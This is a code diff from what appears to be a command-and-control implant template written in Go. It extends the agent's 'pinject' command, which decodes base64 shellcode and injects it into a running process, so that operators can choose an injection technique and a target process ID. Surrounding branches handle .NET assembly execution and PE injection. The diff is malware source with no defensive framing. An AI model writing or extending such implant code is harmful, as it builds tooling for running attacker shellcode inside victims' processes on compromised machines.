@@ -23,22 +23,48 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
         result := a.{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command)
         return result
     } else if strings.HasPrefix(command, "pinject ") {
-        // Handle shellcode injection command - can include technique parameter
+        // Handle shellcode injection command - can include technique and/or PID parameter
         remainingCommand := command[8:] // Remove "pinject " prefix
 
-        // Check if there's a technique specified
-        parts := strings.SplitN(remainingCommand, " ", 2)
+        // Split the command into parts to determine the format
+        parts := strings.Split(remainingCommand, " ")
+
         var encodedShellcode string
         var technique string
+        var pid uint32 = 0
 
-        if len(parts) == 2 {
-            // Technique specified: "technique encoded_shellcode"
-            technique = strings.ToLower(parts[0])
-            encodedShellcode = parts[1]
-        } else {
-            // No technique specified, use auto: "encoded_shellcode"
+        if len(parts) == 1 {
+            // Format: "shellcode" (no technique, no PID)
             technique = "auto"
             encodedShellcode = parts[0]
+        } else if len(parts) == 2 {
+            // Format could be: "technique shellcode" OR "pid shellcode"
+            // Try to parse first part as PID (number) or technique (string)
+            if a.isNumeric(parts[0]) {
+                // First part is numeric, so it's a PID: "pid shellcode"
+                technique = "auto"
+                parsedPid, err := strconv.Atoi(parts[0])
+                if err != nil || parsedPid <= 0 {
+                    return fmt.Sprintf("[ERROR] Invalid PID: %s", parts[0])
+                }
+                pid = uint32(parsedPid)
+                encodedShellcode = parts[1]
+            } else {
+                // First part is not numeric, so it's a technique: "technique shellcode"
+                technique = strings.ToLower(parts[0])
+                encodedShellcode = parts[1]
+            }
+        } else if len(parts) == 3 {
+            // Format: "technique pid shellcode"
+            technique = strings.ToLower(parts[0])
+            parsedPid, err := strconv.Atoi(parts[1])
+            if err != nil || parsedPid <= 0 {
+                return fmt.Sprintf("[ERROR] Invalid PID: %s", parts[1])
+            }
+            pid = uint32(parsedPid)
+            encodedShellcode = parts[2]
+        } else {
+            return "[ERROR] Invalid pinject command format. Usage: pinject [technique] [pid] shellcode"
         }
 
         shellcodeData, err := base64.StdEncoding.DecodeString(encodedShellcode)
@@ -46,7 +72,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
             return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
         }
 
-        result := a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcodeData, technique)
+        result := a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique_and_pid(shellcodeData, technique, pid)
         return result
     } else if strings.HasPrefix(command, "peinject ") {
         // Handle PE injection command - base64 content follows directly after "peinject "
